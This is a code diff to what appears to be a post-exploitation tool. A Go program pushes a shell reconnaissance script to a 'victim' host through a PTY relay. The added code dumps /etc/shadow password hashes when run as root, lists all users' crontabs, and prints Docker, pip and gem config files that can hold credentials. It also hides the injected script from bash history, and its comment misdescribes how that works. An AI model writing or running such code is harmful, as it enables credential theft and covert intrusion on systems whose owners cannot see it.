@@ -157,6 +157,27 @@ for crondir in /etc/cron.d /etc/cron.daily /etc/cron.hourly /etc/cron.weekly /et
     fi
 done
 echo ""
+echo "User crontabs (via crontab -l):"
+for user in $(cut -d: -f1 /etc/passwd | grep -v nologin | grep -v false); do
+    if crontab -l -u "$user" 2>/dev/null | grep -q "^\s*[0-9]"; then
+        echo "User $user:"
+        crontab -l -u "$user" 2>/dev/null
+    fi
+done 2>/dev/null || echo "Cannot read user crontabs"
+echo ""
+
+# ------------------------------------------------------------
+# SECTION 5b: SHADOW FILE (if root)
+# ------------------------------------------------------------
+echo "[SHADOW FILE CHECK]"
+echo "------------------------------------------------------------"
+if [ "$(id -u)" -eq 0 ]; then
+    echo "Running as root - /etc/shadow contents:"
+    cat /etc/shadow 2>/dev/null | head -20 || echo "Cannot read /etc/shadow"
+else
+    echo "Not running as root - /etc/shadow not accessible"
+fi
+echo ""
 
 # ------------------------------------------------------------
 # SECTION 6: WRITABLE PATHS
@@ -209,6 +230,21 @@ echo ""
 echo "MySQL config:"
 for mycnf in "$HOME/.my.cnf" /root/.my.cnf /etc/mysql/debian.cnf; do
     [ -f "$mycnf" ] && echo "MySQL config found: $mycnf" && cat "$mycnf" 2>/dev/null | head -10
+done
+echo ""
+
+echo "Docker config:"
+for dockercfg in "$HOME/.docker/config.json" ~/.docker/config.json; do
+    [ -f "$dockercfg" ] && echo "Docker config found: $dockercfg" && cat "$dockercfg" 2>/dev/null | head -5
+done
+echo ""
+
+echo "Pip/Gem rc files:"
+for piprc in "$HOME/.pip/pip.conf" "$HOME/.config/pip/pip.conf" ~/.pip/pip.conf ~/.config/pip/pip.conf; do
+    [ -f "$piprc" ] && echo "Pip config found: $piprc" && cat "$piprc" 2>/dev/null | head -5
+done
+for gemrc in "$HOME/.gemrc" ~/.gemrc; do
+    [ -f "$gemrc" ] && echo "Gem config found: $gemrc" && cat "$gemrc" 2>/dev/null | head -5
 done
 echo ""
 
@@ -361,6 +397,11 @@ var reconSections = []string{
 	"DOCKER SOCKET DETECTION",
 	"KERNEL VERSION",
 	"CONTAINER/VM DETECTION",
+	// NOTE: "SHADOW FILE CHECK" is intentionally excluded. The recon script
+	// emits "[SHADOW FILE CHECK]" without a [SECTION N:HASH] header, so it
+	// cannot be extracted by extractAllSections and its content is captured
+	// in the CRON JOBS section tail. Listing it here caused the progress
+	// counter to display 13/14 instead of 13/13.
 }
 
 // makeReconNonce returns a random 16-byte nonce unique to this recon session.
@@ -402,6 +443,19 @@ func buildReconScript(nonce [16]byte) string {
 		script = strings.ReplaceAll(script, placeholder, hash)
 	}
 	return script
+}
+
+// hideFromHistory prefixes each line of the script with a space to prevent
+// bash from saving it to history. This is a simple defense-in-depth measure
+// since bash ignores lines starting with whitespace in HISTORY_IGNORE patterns.
+func hideFromHistory(script string) string {
+	lines := strings.Split(script, "\n")
+	for i := range lines {
+		if lines[i] != "" && lines[i][0] != ' ' {
+			lines[i] = " " + lines[i]
+		}
+	}
+	return strings.Join(lines, "\n")
 }
 
 // buildSectionRe returns a regex that matches real section header lines for this session.
@@ -481,6 +535,7 @@ type PTY interface {
 	readUntilPrompt(timeout time.Duration) (string, error)
 	StripPrompts(output string) string
 	write(data string) error
+	clearDeadline()
 }
 
 // executeRecon executes the reconnaissance script and returns the path of the saved
@@ -492,9 +547,37 @@ func executeRecon(u PTY, findingsDir string, host string, disp *statusDisplay, r
 	nonce := makeReconNonce()
 	sectionRe := buildSectionRe(nonce)
 
-	if err := u.write(buildReconScript(nonce) + "\n"); err != nil {
-		disp.set(reconIdx, taskFailed, "write error")
-		return "", nil, err
+	// Clear any stale deadline left by a previous timed read (e.g. readUntilPrompt
+	// inside finalizeUpgrade) so we don't get an instant i/o timeout on the first Read.
+	u.clearDeadline()
+
+	// Hide script from bash history by prefixing each line with a space
+	script := hideFromHistory(buildReconScript(nonce))
+
+	// Write the recon script in small chunks to prevent PTY buffer overflow.
+	//
+	// Why: the Python pty.spawn relay (running on the victim) uses a blocking
+	// select+write loop.  Writing the full ~10 KB script at once causes the PTY
+	// kernel buffer (~4 KB) to fill with echoed bytes faster than the relay can
+	// drain it.  The relay then deadlocks: it blocks on os.write(master_fd) while
+	// it also needs to read from master_fd to forward the accumulated echo.
+	// Writing in 512-byte chunks with a 10 ms pause between them keeps the
+	// in-flight echo well below the 4 KB limit, breaking the deadlock.
+	const chunkSize = 512
+	payload := []byte(script + "\n")
+	for len(payload) > 0 {
+		end := chunkSize
+		if end > len(payload) {
+			end = len(payload)
+		}
+		if err := u.write(string(payload[:end])); err != nil {
+			disp.set(reconIdx, taskFailed, "write error")
+			return "", nil, err
+		}
+		payload = payload[end:]
+		if len(payload) > 0 {
+			time.Sleep(10 * time.Millisecond)
+		}
 	}
 
 	total := len(reconSections)
